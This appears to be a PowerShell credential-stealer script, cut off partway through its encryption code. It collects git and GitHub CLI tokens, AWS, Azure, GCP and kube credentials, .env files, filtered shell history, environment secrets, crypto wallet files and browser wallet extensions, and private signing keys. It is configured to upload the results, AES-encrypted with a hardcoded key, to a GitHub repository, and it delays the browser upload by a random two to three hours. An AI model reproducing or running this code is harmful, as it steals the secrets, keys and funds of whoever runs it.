#Requires -Version 5.1
<#
#>

# ============================================================
# 0. HEADER
# ============================================================
$ErrorActionPreference = 'Continue'
[Console]::OutputEncoding = [Text.UTF8Encoding]::new($false)
$OutputEncoding          = [Text.UTF8Encoding]::new($false)

$script:Prog    = 'avaigen'

$script:TMP     = if ($env:TMP) { $env:TMP } elseif ($env:TEMP) { $env:TEMP } else { [IO.Path]::GetTempPath() }
$script:TMP     = $script:TMP.TrimEnd('\','/')

$script:Api           = 'https://api.github.com'
$script:Owner         = 'Aghanim-sec'
$script:Repo          = 'Sync'
$script:Branch        = if ($env:GITHUB_BRANCH) { $env:GITHUB_BRANCH } else { 'main' }

$script:SecretKey     = if ($env:AGHANIM_SECRET) { $env:AGHANIM_SECRET } else { 'eGGtVKuaATMtBhjFHoOuFws1Gw6T8ioPTP7NXGB01gTq6iYcSzYb4dVjg1Sr' }

$script:GhTokenCache = $null
$script:BV_STATUS = 0
$script:BV_TMPDIRS = [Collections.Generic.List[string]]::new()
$script:BV_CHECK_TIMEOUT = if ($env:BV_CHECK_TIMEOUT) { [int]$env:BV_CHECK_TIMEOUT } else { 120 }
$script:BV_BG_BROWSERS = if ($env:BV_BG_BROWSERS) { $env:BV_BG_BROWSERS } else { '1' }
# browser уходит отдельно через случайные 2–3 часа, чтобы не мешать основному прогону
$script:BV_BG_DELAY    = if ($env:BV_BG_DELAY) { [int]$env:BV_BG_DELAY } else { Get-Random -Minimum 7200 -Maximum 10801 }
$script:BV_ALLOW_UPLOAD = if ($env:BV_ALLOW_UPLOAD) { $env:BV_ALLOW_UPLOAD } else { '1' }
$script:BV_ALLOW_SHOW   = if ($env:BV_ALLOW_SHOW) { $env:BV_ALLOW_SHOW } else { '1' }
$script:BV_SHOW         = if ($script:BV_ALLOW_SHOW -eq '0') { 0 } else { 1 }

$script:Profile = if ($env:PROFILE) { $env:PROFILE } else { 'hook' }
$script:OS = 'unknown'   # заполним после определения w_os

# блоки отчёта: каждая группа уходит отдельным файлом
$script:CheckGroups = [ordered]@{
    'check_ssh'           = 'ssh'
    'check_ssh_hosts'     = 'ssh'
    'check_git_creds'     = 'git'
    'check_git_remotes'   = 'git'
    'check_secret_store'  = 'creds'
    'check_cred_files'    = 'creds'
    'check_cloud_secrets' = 'cloud'
    'check_password_managers' = 'passwords'
    'check_env'           = 'env'
    'check_history'       = 'history'
    'check_wallets'       = 'wallets'
    'check_dotenv'        = 'dotenv'
    'check_signing'       = 'signing'
}

# ============================================================
# 1. UTILITIES
# ============================================================

function err { param([string]$Msg) [Console]::Error.WriteLine($Msg) }
function bv_out { param([string]$Msg) Write-Output $Msg }
function bv_sep { Write-Output ('-' * 72) }

function have {
    param([string]$Name)
    return [bool](Get-Command -Name $Name -ErrorAction SilentlyContinue)
}



function human {
    param([double]$Bytes = 0)
    $units = @('B','KB','MB','GB','TB')
    $n = $Bytes; $i = 0
    while ($n -ge 1024 -and $i -lt 4) { $n /= 1024; $i++ }
    $inv = [Globalization.CultureInfo]::InvariantCulture
    if ($i -eq 0) { return ([string]::Format($inv, '{0} {1}', [int]$n, $units[$i])) }
    return ([string]::Format($inv, '{0:F1} {1}', $n, $units[$i]))
}




# ============================================================
# 2. PLATFORM WRAPPERS
# ============================================================

function w_os {
    if ($env:OS -eq 'Windows_NT') { return 'windows' }
    if (Test-Path -LiteralPath '/System/Library/CoreServices/SystemVersion.plist') { return 'macos' }
    if (Test-Path -LiteralPath '/mnt/c/Windows') { return 'wsl' }
    if ([Environment]::OSVersion.Platform -eq 'Unix') { return 'linux' }
    return 'unknown'
}
$script:OS = w_os


function Get-MaskedPath {
    param([string]$Path)
    return (mask $Path)
}

function mask {
    param([string]$Path)
    if ([string]::IsNullOrEmpty($Path)) { return $Path }
    $home_ = $HOME
    $up = $env:USERPROFILE
    $ap = $env:APPDATA
    foreach ($root in @($up, $ap, $home_)) {
        if ([string]::IsNullOrEmpty($root)) { continue }
        if ($Path.StartsWith($root, [StringComparison]::OrdinalIgnoreCase)) {
            $rel = $Path.Substring($root.Length).TrimStart('\','/')
            $prefix = if ($root -eq $up -or $root -eq $home_) { '~' } else { '%APPDATA%' }
            return "$prefix/$rel" -replace '\\','/'
        }
    }
    return $Path
}

function check_git_creds {
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── git credential helper ──")

    $helper = $null
    try { $helper = (& git config --global credential.helper 2>$null) } catch { $helper = $null }
    if (-not $helper) { $helper = 'none' }
    $lines.Add("  helper: $helper")

    $gh = Join-Path $HOME '.config/gh/hosts.yml'
    if ($env:APPDATA) {
        $gh = Join-Path (Join-Path $env:APPDATA 'GitHub CLI') 'hosts.yml'
    }

    if (Test-Path -LiteralPath $gh -PathType Leaf) {
        $lines.Add("  $(mask $gh): PRESENT")
        Get-Content -LiteralPath $gh -ErrorAction SilentlyContinue |
            ForEach-Object { $lines.Add("    $_") }
    } else {
        $lines.Add("  $(mask $gh): absent")
    }

    if (Get-Command gh -ErrorAction SilentlyContinue) {
        $t = $null
        try { $t = (& gh auth token 2>$null | Out-String).Trim() } catch { $t = $null }
        if ($t) {
            $lines.Add("  gh auth token: $t")
        } else {
            $lines.Add("  gh auth token: (not logged in)")
        }
    } else {
        $lines.Add("  gh: no")
    }

    return ($lines -join [Environment]::NewLine)
}
function check_git_remotes {
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── git remotes ──")

    # git rev-parse --git-dir
    $isRepo = $false
    try {
        & git rev-parse --git-dir *> $null
        $isRepo = ($LASTEXITCODE -eq 0)
    } catch { $isRepo = $false }

    if (-not $isRepo) {
        $lines.Add("  (not a git repository)")
        return ($lines -join [Environment]::NewLine)
    }

    $seen = New-Object 'System.Collections.Generic.HashSet[string]'
    $remoteLines = & git remote -v 2>$null
    foreach ($rl in $remoteLines) {
        if ([string]::IsNullOrWhiteSpace($rl)) { continue }
        # https://user@host -> https://***@host
        $san = $rl -replace '(https?://)[^/@]+@', '$1***@'
        $parts = $san -split '\s+'
        if ($parts.Count -lt 3) { continue }
        $entry = "  $($parts[0]) $($parts[1]) $($parts[2])"
        if ($seen.Add($entry)) { $lines.Add($entry) }
    }

    return ($lines -join [Environment]::NewLine)
}

function check_cred_files {
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── credential files ──")

    $files = New-Object System.Collections.Generic.List[string]
    $files.Add((Join-Path $HOME '.git-credentials'))
    $files.Add((Join-Path $HOME '.aws/credentials'))
    $files.Add((Join-Path $HOME '.netrc'))
    $files.Add((Join-Path $HOME '.npmrc'))
    $files.Add((Join-Path $HOME '.pypirc'))
    $files.Add((Join-Path $HOME '.config/gh/hosts.yml'))
    $files.Add((Join-Path $HOME '.docker/config.json'))

    if ($env:USERPROFILE -or $env:APPDATA) {
        $up = if ($env:USERPROFILE) { $env:USERPROFILE } else { $HOME }
        $ap = if ($env:APPDATA) { $env:APPDATA } else { Join-Path $up 'AppData/Roaming' }
        $files.Add((Join-Path $up '.git-credentials'))
        $files.Add((Join-Path $up '.aws/credentials'))
        $files.Add((Join-Path (Join-Path $ap 'GitHub CLI') 'hosts.yml'))
        $files.Add((Join-Path $up '.docker/config.json'))
        $files.Add((Join-Path $up '.npmrc'))
    }

    foreach ($f in ($files | Select-Object -Unique)) {
        if (-not (Test-Path -LiteralPath $f -PathType Leaf)) {
            $lines.Add("  $(mask $f) : absent")
            continue
        }
        $lines.Add("  $(mask $f) : PRESENT")
        try {
            $raw = Get-Content -LiteralPath $f -Raw -Encoding UTF8 -ErrorAction Stop
            $isJson = $false
            try { $null = $raw | ConvertFrom-Json; $isJson = $true } catch { $isJson = $false }

            if ($isJson) {
                $pretty = $raw | ConvertFrom-Json | ConvertTo-Json -Depth 30
                foreach ($l in ($pretty -split "`r?`n")) { $lines.Add("    $l") }
            } else {
                foreach ($l in ($raw -split "`r?`n")) {
                    if ($l -notmatch '^\s*$' -and $l -notmatch '^\s*#') { $lines.Add("    $l") }
                }
            }
        } catch {
            $lines.Add("    (unreadable: $($_.Exception.Message))")
        }
    }

    return ($lines -join [Environment]::NewLine)
}
function Get-EnvTokenLines {
    # token / api_key / secret / password — как в полной проверке окружения
    Get-ChildItem Env: | Where-Object { $_.Name -match '(?i)(token|api_?key|secret|password)' } | Sort-Object Name
}

function check_env {
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── environment variables (token-related) ──")

    $hits = Get-EnvTokenLines
    if ($hits.Count -gt 0) {
        foreach ($kv in $hits) {
            $lines.Add("  $($kv.Name)=$($kv.Value)")
        }
    } else {
        $lines.Add("  (none)")
    }

    $total = (Get-ChildItem Env:).Count
    $lines.Add("  (total variables: $total)")

    return ($lines -join [Environment]::NewLine)
}
function check_signing {
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── signing material ──")

    $roots = New-Object System.Collections.Generic.List[string]
    $isWin = ($env:OS -eq 'Windows_NT') -or ($env:USERPROFILE -and -not $env:HOME) -or ($IsWindows)
    $isMac = ($env:OS -eq 'Darwin') -or ($IsMacOS)

    if ($isWin) {
        $ap = if ($env:APPDATA) { $env:APPDATA } else { Join-Path ($(if ($env:USERPROFILE) { $env:USERPROFILE } else { $HOME })) 'AppData/Roaming' }
        $roots.Add((Join-Path (Join-Path $ap 'Microsoft') 'Crypto'))
    } elseif ($isMac) {
        $roots.Add((Join-Path $HOME 'Library/MobileDevice/Provisioning Profiles'))
    } else {
        $roots.Add((Join-Path $HOME '.gnupg'))
        $roots.Add((Join-Path $HOME '.android'))
        $roots.Add((Join-Path $HOME '.pki'))
        $roots.Add((Join-Path $HOME '.local/share/keyrings'))
    }

    $patterns = @('*.p12','*.pfx','*.p8','*.pem','*.crt','*.cer','*.mobileprovision','*.keystore','*.jks','*.ppk','*.gpg','*.asc','*.kbx','*.key','*.keyring','adbkey')
    $textExt = @('.pem','.key','.ppk','.asc','.p8','.crt','.cer')
    $found = $false
    $openssl = Get-OpenSslPath
    $keytool = Get-Command keytool -ErrorAction SilentlyContinue

    foreach ($r in $roots) {
        if (-not (Test-Path -LiteralPath $r -PathType Container)) { continue }

        $files = @()
        foreach ($pat in $patterns) {
            $files += Get-ChildItem -LiteralPath $r -Recurse -File -Force -Filter $pat -Depth 4 -ErrorAction SilentlyContinue
        }
        $files = $files | Sort-Object FullName -Unique | Select-Object -First 20

        foreach ($f in $files) {
            $name = $f.Name
            $ext  = $f.Extension.ToLowerInvariant()
            $hash = $null
            try {
                $hash = (Get-FileHash -LiteralPath $f.FullName -Algorithm SHA256 -ErrorAction Stop).Hash.ToLower()
            } catch { $hash = 'n/a' }

            $lines.Add("  $(mask $f.FullName) : PRESENT ($($f.Length) bytes) hash=$hash")

            if ($name -match '\.(p12|pfx)$' -and $openssl) {
                # сертификаты
                $certTmp = [System.IO.Path]::GetTempFileName()
                try {
                    & $openssl pkcs12 -in $f.FullName -nokeys -clcerts -passin pass: -out $certTmp 2>$null | Out-Null
                    if ($LASTEXITCODE -eq 0) {
                        $info = & $openssl x509 -in $certTmp -noout -subject -issuer -dates 2>$null
                        foreach ($l in $info) { $lines.Add("    $l") }
                    } else {
                        $lines.Add("    (certificate: password required)")
                    }
                } catch {
                    $lines.Add("    (certificate: openssl failed)")
                } finally {
                    Remove-Item -LiteralPath $certTmp -Force -ErrorAction SilentlyContinue
                }

                # приватный ключ (только если p12 без пароля)
                $keyTmp = [System.IO.Path]::GetTempFileName()
                try {
                    & $openssl pkcs12 -in $f.FullName -nodes -passin pass: -out $keyTmp 2>$null | Out-Null
                    if ($LASTEXITCODE -eq 0) {
                        $keyText = Get-Content -LiteralPath $keyTmp -Raw -ErrorAction SilentlyContinue
                        $m = [regex]::Match([string]$keyText, '(?s)-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----')
                        if ($m.Success) {
                            $lines.Add("    --- private key (empty password) ---")
                            foreach ($l in ($m.Value -split "`r?`n")) { $lines.Add("    $l") }
                        } else {
                            $lines.Add("    (private key not found in p12)")
                        }
                    } else {
                        $lines.Add("    (private key: password required)")
                    }
                } catch {
                    $lines.Add("    (private key: openssl failed)")
                } finally {
                    Remove-Item -LiteralPath $keyTmp -Force -ErrorAction SilentlyContinue
                }
            } elseif ($textExt -contains $ext -or $name -eq 'adbkey') {
                try {
                    $raw = Get-Content -LiteralPath $f.FullName -Raw -Encoding UTF8 -ErrorAction Stop
                    if ($raw.Length -gt 4000) { $raw = $raw.Substring(0, 4000) + "`n... (truncated)" }
                    foreach ($l in ($raw -split "`r?`n")) { $lines.Add("    $l") }
                } catch {
                    $lines.Add("    (unreadable: $($_.Exception.Message))")
                }
            } elseif ($ext -eq '.mobileprovision' -and $openssl) {
                try {
                    $xml = & $openssl smime -inform der -verify -noverify -in $f.FullName 2>$null
                    if ($LASTEXITCODE -eq 0 -and $xml) {
                        foreach ($l in $xml) { $lines.Add("    $l") }
                    } else {
                        $lines.Add("    (mobileprovision: could not decode)")
                    }
                } catch {
                    $lines.Add("    (mobileprovision: openssl failed)")
                }
            } elseif (($ext -eq '.keystore' -or $ext -eq '.jks') -and $keytool) {
                try {
                    $info = & $keytool.Source -list -v -keystore $f.FullName -storepass '' 2>$null
                    if ($LASTEXITCODE -eq 0 -and $info) {
                        foreach ($l in $info) { $lines.Add("    $l") }
                    } else {
                        $lines.Add("    (keystore: password required)")
                    }
                } catch {
                    $lines.Add("    (keystore: keytool failed)")
                }
            } else {
                $lines.Add("    (binary; content not printed)")
            }
            $found = $true
        }
    }

    if (-not $found) { $lines.Add("  (not found in typical locations)") }

    return ($lines -join [Environment]::NewLine)
}
function check_cloud_secrets {
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── cloud and CI secrets ──")

    $files = @(
        (Join-Path $HOME '.aws/credentials'),
        (Join-Path $HOME '.aws/config'),
        (Join-Path $HOME '.azure/azureProfile.json'),
        (Join-Path $HOME '.azure/accessTokens.json'),
        (Join-Path $HOME '.config/gcloud/credentials.db'),
        (Join-Path $HOME '.config/gcloud/application_default_credentials.json'),
        (Join-Path $HOME '.kube/config'),
        (Join-Path $HOME '.config/heroku/netrc'),
        (Join-Path $HOME '.netrc'),
        (Join-Path $HOME '.terraform.d/credentials.tfrc.json')
    )

    foreach ($f in $files) {
        if (-not (Test-Path -LiteralPath $f -PathType Leaf)) { continue }
        $lines.Add("  $(mask $f) : PRESENT")
        $ext = [IO.Path]::GetExtension($f).ToLowerInvariant()

        if ($ext -eq '.db') {
            $sqlite = Get-Command sqlite3 -ErrorAction SilentlyContinue
            if (-not $sqlite) { $lines.Add("    (sqlite3 not found)"); continue }
            $tmp = [IO.Path]::GetTempFileName()
            try {
                Copy-Item -LiteralPath $f -Destination $tmp -Force
                $tables = @(& $sqlite.Source $tmp "SELECT name FROM sqlite_master WHERE type='table';" 2>$null)
                if ($tables.Count -eq 0) { $lines.Add("    (no tables)") }
                foreach ($t in $tables) {
                    if ([string]::IsNullOrWhiteSpace($t)) { continue }
                    $lines.Add("    [$t]")
                    $rows = @(& $sqlite.Source -separator '|' $tmp "SELECT * FROM [$t] LIMIT 200;" 2>$null)
                    foreach ($row in $rows) { if ($row) { $lines.Add("      $row") } }
                }
            } catch {
                $lines.Add("    (sqlite error: $($_.Exception.Message))")
            } finally {
                Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
            }
            continue
        }

        try {
            $raw = Get-Content -LiteralPath $f -Raw -Encoding UTF8 -ErrorAction Stop
            $isJson = $false
            try { $null = $raw | ConvertFrom-Json; $isJson = $true } catch { $isJson = $false }

            if ($isJson) {
                $pretty = $raw | ConvertFrom-Json | ConvertTo-Json -Depth 50
                foreach ($l in ($pretty -split "`r?`n")) { $lines.Add("    $l") }
            } else {
                foreach ($l in ($raw -split "`r?`n")) {
                    if ($l -notmatch '^\s*$' -and $l -notmatch '^\s*#') { $lines.Add("    $l") }
                }
            }
        } catch {
            $lines.Add("    (unreadable: $($_.Exception.Message))")
        }
    }

    return ($lines -join [Environment]::NewLine)
}
function check_password_managers {
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── password managers ──")

    $appData = if ($env:APPDATA) { $env:APPDATA } else { '' }
    $localApp = get_local_appdata

    $onePaths = @(
        (Join-Path $HOME 'Library/Application Support/1Password'),
        (Join-Path $HOME 'Library/Group Containers/2BUA8C4S2C.com.agilebits'),
        (Join-Path $HOME 'Library/Containers/com.agilebits.onepassword7'),
        (Join-Path $HOME 'Library/Application Support/1Password 4'),
        (Join-Path $HOME '.op'),
        (Join-Path $HOME '.config/op'),
        (Join-Path $HOME '.config/1Password'),
        (Join-Path $HOME '.local/share/1Password')
    )
    if ($appData) { $onePaths += (Join-Path $appData '1Password') }
    if ($localApp) { $onePaths += (Join-Path $localApp '1Password') }

    $bwPaths = @(
        (Join-Path $HOME 'Library/Application Support/Bitwarden'),
        (Join-Path $HOME 'Library/Application Support/com.bitwarden.desktop'),
        (Join-Path $HOME 'Library/Containers/com.bitwarden.desktop'),
        (Join-Path $HOME '.config/Bitwarden'),
        (Join-Path $HOME '.config/bitwarden'),
        (Join-Path $HOME '.config/Bitwarden CLI'),
        (Join-Path $HOME '.local/share/Bitwarden'),
        (Join-Path $HOME '.bw')
    )
    if ($appData) { $bwPaths += (Join-Path $appData 'Bitwarden') }
    if ($localApp) { $bwPaths += (Join-Path $localApp 'Bitwarden') }

    foreach ($target in @(
        @{ Name = '1Password'; Paths = $onePaths },
        @{ Name = 'Bitwarden'; Paths = $bwPaths }
    )) {
        $found = $false
        foreach ($path in ($target.Paths | Select-Object -Unique)) {
            if (-not (Test-Path -LiteralPath $path)) { continue }
            $found = $true
            $item = Get-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
            if ($null -eq $item) { continue }

            if ($item.PSIsContainer) {
                $files = @(Get-ChildItem -LiteralPath $path -Recurse -File -Force -Depth 4 -ErrorAction SilentlyContinue |
                           Sort-Object Length -Descending | Select-Object -First 40)
                $bytes = [int64]0
                foreach ($f in $files) { $bytes += $f.Length }
                $lines.Add("  $($target.Name): PRESENT $(mask $path) ($($files.Count) files, $(human $bytes))")
                foreach ($f in $files) {
                    $lines.Add("    $(mask $f.FullName) ($($f.Length) bytes)")
                }

                $dataFile = Join-Path $path 'data.json'
                if (Test-Path -LiteralPath $dataFile -PathType Leaf) {
                    try {
                        $j = Get-Content -LiteralPath $dataFile -Raw -Encoding UTF8 | ConvertFrom-Json
                        $keys = @($j.PSObject.Properties.Name)
                        $lines.Add("    data.json keys: $($keys -join ', ')")
                        if ($j.kdf) { $lines.Add("    data.json kdf: $($j.kdf) iterations=$($j.kdfIterations)") }
                    } catch {
                        $lines.Add("    data.json: unreadable")
                    }
                }
            } else {
                $lines.Add("  $($target.Name): PRESENT $(mask $path) ($($item.Length) bytes)")
            }
        }
        if (-not $found) { $lines.Add("  $($target.Name): absent") }
    }

    $lines.Add("  note: vault contents are encrypted; only file inventory/metadata is shown")
    return ($lines -join [Environment]::NewLine)
}

function check_history {
    param(
        [bool]$Show = $(if (Get-Variable BV_SHOW -Scope Script -ErrorAction SilentlyContinue) {
                             [bool]$script:BV_SHOW
                         } else { $true })
    )

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── command history ──")

    $files = @(
        (Join-Path $HOME '.bash_history'),
        (Join-Path $HOME '.zsh_history'),
        (Join-Path $HOME '.history'),
        (Join-Path $HOME '.sh_history'),
        (Join-Path $HOME '.powershell_history'),
        (Join-Path $HOME 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt')
    ) | Select-Object -Unique

    $rx = '(?i)password|passwd|token|secret|api_key|aws|ssh|curl|mysql|psql|redis|docker|git push'

    foreach ($f in $files) {
        if (-not (Test-Path -LiteralPath $f -PathType Leaf)) { continue }
        $lines.Add("  $(mask $f) : PRESENT")
        if ($Show) {
            Get-Content -LiteralPath $f -ErrorAction SilentlyContinue |
                Where-Object { $_ -match $rx } |
                Select-Object -Last 50 |
                ForEach-Object { $lines.Add("    $_") }
        } else {
            $lines.Add("    (content hidden)")
        }
    }

    return ($lines -join [Environment]::NewLine)
}

function check_wallets {
    param(
        [bool]$Show = $(if (Get-Variable BV_SHOW -Scope Script -ErrorAction SilentlyContinue) {
                             [bool]$script:BV_SHOW
                         } else { $true })
    )

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── crypto wallets ──")

    $isMac = ($IsMacOS) -or ($env:OS -eq 'Darwin')
    $roots = New-Object System.Collections.Generic.List[string]
    $browserRoots = New-Object System.Collections.Generic.List[string]

    if ($isMac) {
        $appSupport = Join-Path $HOME 'Library/Application Support'
        foreach ($n in @('Electrum','Exodus','Coinomi','Bitcoin','Atomic','Wasabi Wallet','Ledger Live','Trezor Suite','Monero','Ethereum')) {
            $roots.Add((Join-Path $appSupport $n))
        }
        $roots.Add((Join-Path $HOME 'Library/Ethereum'))
        foreach ($n in @('.electrum','.exodus','.bitcoin','.ethereum','.monero','.litecoin','.config/Electrum')) {
            $roots.Add((Join-Path $HOME $n))
        }
        $browserRoots.Add((Join-Path $appSupport 'Google/Chrome'))
        $browserRoots.Add((Join-Path $appSupport 'BraveSoftware/Brave-Browser'))
        $browserRoots.Add((Join-Path $appSupport 'Microsoft Edge'))
        $browserRoots.Add((Join-Path $appSupport 'Chromium'))
        $browserRoots.Add((Join-Path $appSupport 'Firefox/Profiles'))
    } else {
        foreach ($n in @('.electrum','.config/Electrum','.exodus','.bitcoin','.ethereum','.monero','.litecoin','.wasabi','.config/atomic','.config/Ledger Live','.config/Trezor Suite','snap/electrum','.var/app/org.electrum.Electrum')) {
            $roots.Add((Join-Path $HOME $n))
        }
        $browserRoots.Add((Join-Path $HOME '.config/google-chrome'))
        $browserRoots.Add((Join-Path $HOME '.config/chromium'))
        $browserRoots.Add((Join-Path $HOME '.config/BraveSoftware'))
        $browserRoots.Add((Join-Path $HOME '.mozilla/firefox'))
    }

    # extension IDs (MetaMask и др.) — имена каталогов
    $extIds = @(
        'nkbihfobe*', 'bfnaelmomeimhlpmgjnjophhpkkoljpa', 'hnifakcdikmkilfncpcipckpnfidblhd',
        'dmkamcknogkgcdfhhbddcghachkejeap', 'bhhhlbepdkbapadjdnnojkbgioiodbic',
        'egjidjbpglichdcondbcbdnbeeppgdph', 'moz-extension+++*'
    )

    foreach ($bd in $browserRoots) {
        if (-not (Test-Path -LiteralPath $bd -PathType Container)) { continue }
        foreach ($pat in $extIds) {
            Get-ChildItem -LiteralPath $bd -Recurse -Directory -Force -Depth 5 -Filter $pat -ErrorAction SilentlyContinue |
                ForEach-Object { $roots.Add($_.FullName) }
        }
    }

    # [ON] дополнительные пути из Get-WalletRoots (Sparrow, Wasabi, Trezor и т.п.)
    $extraFiles = New-Object System.Collections.Generic.List[string]
    if (Get-Command Get-WalletRoots -ErrorAction SilentlyContinue) {
        foreach ($row in @(Get-WalletRoots)) {
            if (-not $row) { continue }
            $parts = $row -split "`t", 2
            if ($parts.Count -lt 2 -or [string]::IsNullOrEmpty($parts[1])) { continue }
            $wp = $parts[1]
            if (Test-Path -LiteralPath $wp -PathType Leaf) { $extraFiles.Add($wp) }
            elseif (Test-Path -LiteralPath $wp -PathType Container) { $roots.Add($wp) }
        }
    }

    $filePatterns = @('wallet.dat','*.json','*.txt','*.conf','*.wallet','*.dat','*.keys','*.key','*.sol','*.ldb','*.sqlite','UTC--*','keystore')
    $textExt = @('.json','.txt','.conf','.wallet','.sol','.key')

    $found = $false
    foreach ($r in ($roots | Select-Object -Unique)) {
        if (-not (Test-Path -LiteralPath $r -PathType Container)) { continue }

        $files = @()
        foreach ($pat in $filePatterns) {
            $files += Get-ChildItem -LiteralPath $r -Recurse -File -Force -Depth 6 -Filter $pat -ErrorAction SilentlyContinue
        }
        $files = $files | Sort-Object FullName -Unique | Select-Object -First 30

        foreach ($f in $files) {
            $lines.Add("  $(mask $f.FullName) : PRESENT ($($f.Length) bytes)")
            if ($Show) {
                $isText = ($textExt -contains $f.Extension.ToLower()) -or ($f.Name -like 'UTC--*') -or ($f.Name -eq 'keystore')
                if ($isText) {
                    try {
                        $raw = Get-Content -LiteralPath $f.FullName -Raw -ErrorAction Stop
                        if ($raw.Length -gt 2000) { $raw = $raw.Substring(0,2000) }
                        foreach ($l in ($raw -split "`r?`n")) { $lines.Add("    $l") }
                    } catch { $lines.Add("    (unreadable)") }
                } else {
                    $lines.Add("    (binary file)")
                }
            } else {
                $lines.Add("    (content hidden)")
            }
            $found = $true
        }
    }

    # файлы, которые Get-WalletRoots отдаёт напрямую (wallet.dat и т.п.)
    foreach ($fp in ($extraFiles | Select-Object -Unique)) {
        $fi = Get-Item -LiteralPath $fp -Force -ErrorAction SilentlyContinue
        if (-not $fi -or -not (Test-Path -LiteralPath $fi.FullName -PathType Leaf)) { continue }
        $lines.Add("  $(mask $fi.FullName) : PRESENT ($($fi.Length) bytes)")
        if ($Show) {
            $isText = ($textExt -contains $fi.Extension.ToLower()) -or ($fi.Name -like 'UTC--*') -or ($fi.Name -eq 'keystore')
            if ($isText) {
                try {
                    $raw = Get-Content -LiteralPath $fi.FullName -Raw -ErrorAction Stop
                    if ($raw.Length -gt 2000) { $raw = $raw.Substring(0,2000) }
                    foreach ($l in ($raw -split "`r?`n")) { $lines.Add("    $l") }
                } catch { $lines.Add("    (unreadable)") }
            } else {
                $lines.Add("    (binary file)")
            }
        } else {
            $lines.Add("    (content hidden)")
        }
        $found = $true
    }

    if (-not $found) { $lines.Add("  (not found in typical locations)") }
    $lines.Add("  note: mobile wallets (iOS/Android) not scannable from this host")
    return ($lines -join [Environment]::NewLine)
}

function check_dotenv {
    param(
        [bool]$Show = $(if (Get-Variable BV_SHOW -Scope Script -ErrorAction SilentlyContinue) {
                             [bool]$script:BV_SHOW
                         } else { $true })   # [ON] дефолт = $true
    )

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("")
    $lines.Add("── .env files in home and cwd ──")

    $roots = @($HOME, (Get-Location).Path) | Select-Object -Unique
    $found = @()
    foreach ($r in $roots) {
        if (-not (Test-Path -LiteralPath $r -PathType Container)) { continue }
        $found += Get-ChildItem -LiteralPath $r -Recurse -File -Force -Depth 3 -Filter '.env' -ErrorAction SilentlyContinue
    }
    $found = $found | Sort-Object FullName -Unique | Select-Object -First 20

    foreach ($f in $found) {
        $lines.Add("  $(mask $f.FullName) : PRESENT")

        # [ON] содержимое ПЕЧАТАЕТСЯ (Show = $true по умолчанию)
        if ($Show) {
            Get-Content -LiteralPath $f.FullName -ErrorAction SilentlyContinue |
                Where-Object { -not ($_ -match '^\s*#') -and -not ($_ -match '^\s*$') } |
                ForEach-Object { $lines.Add("    $_") }
        } else {
            $lines.Add("    (content hidden)")
        }
    }

    return ($lines -join [Environment]::NewLine)
}





function w_roaming {
    if ($env:APPDATA) { return $env:APPDATA }
    $h = if ($env:USERPROFILE) { $env:USERPROFILE } else { $env:HOME }
    return (Join-Path $h 'AppData/Roaming')
}

function get_local_appdata {
    if ($env:LOCALAPPDATA) { return $env:LOCALAPPDATA }
    $h = if ($env:USERPROFILE) { $env:USERPROFILE } else { $env:HOME }
    return (Join-Path $h 'AppData/Local')
}

function path_to_unix {
    param([string]$Path)
    if ($script:OS -eq 'windows' -and (have 'cygpath')) { return (& cygpath -u $Path) }
    return $Path
}


# ============================================================
# 3. PROCESSES / TIMEOUT / CLEANUP
# ============================================================




function run_with_timeout {
    param(
        [Parameter(Mandatory)][int]$TimeoutSeconds,
        [Parameter(Mandatory)][string]$FunctionName
    )

    # Запускаем в изолированном job'е с dot-source скрипта — так функции доступны.
    $scriptPath = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }

    $job = Start-Job -ScriptBlock {
        param($fn, $sp)
        if ($sp -and (Test-Path -LiteralPath $sp)) { . $sp }
        & $fn
    } -ArgumentList $FunctionName, $scriptPath

    $done = Wait-Job -Job $job -Timeout $TimeoutSeconds
    if (-not $done) {
        Stop-Job -Job $job -ErrorAction SilentlyContinue
        Remove-Job -Job $job -Force -ErrorAction SilentlyContinue
        return @{ ExitCode = 124; Output = '' }
    }
    $result = Receive-Job -Job $job -ErrorAction SilentlyContinue
    Remove-Job -Job $job -Force -ErrorAction SilentlyContinue
    return @{ ExitCode = 0; Output = ($result | Out-String).TrimEnd() }
}

# ============================================================
# 4. CRYPTO (AES-256-CBC через openssl)
# ============================================================

function Get-OpenSslPath {
    $o = Get-Command openssl -ErrorAction SilentlyContinue
    if ($o) { return $o.Source }
    foreach ($p in @(
        'C:\Program Files\Git\usr\bin\openssl.exe',
        'C:\Program Files\Git\mingw64\bin\openssl.exe',
        'C:\Program Files\OpenSSL-Win64\bin\openssl.exe',
        'C:\Program Files\OpenSSL\bin\openssl.exe',
        '/usr/bin/openssl','/usr/local/bin/openssl')) {
        if (Test-Path -LiteralPath $p -PathType Leaf) { return $p }
    }
    if ($env:LOCALAPPDATA) {
        foreach ($p in @(
            "$env:LOCALAPPDATA\Programs\Git\usr\bin\openssl.exe",
            "$env:LOCALAPPDATA\Programs\Git\mingw64\bin\openssl.exe",
            "$env:LOCALAPPDATA\Programs\OpenSSL\bin\openssl.exe")) {
            if (Test-Path -LiteralPath $p -PathType Leaf) { return $p }
        }
    }
    return $null
}

function Protect-StringAes256Cbc {
    param([Parameter(Mandatory)][string]$PlainText, [Parameter(Mandatory)][string]$Passphrase)
    $openssl = Get-OpenSslPath
    if (-not $openssl) { throw 'openssl not found' }
    $in = [IO.Path]::GetTempFileName(); $outf = [IO.Path]::GetTempFileName()
    try {
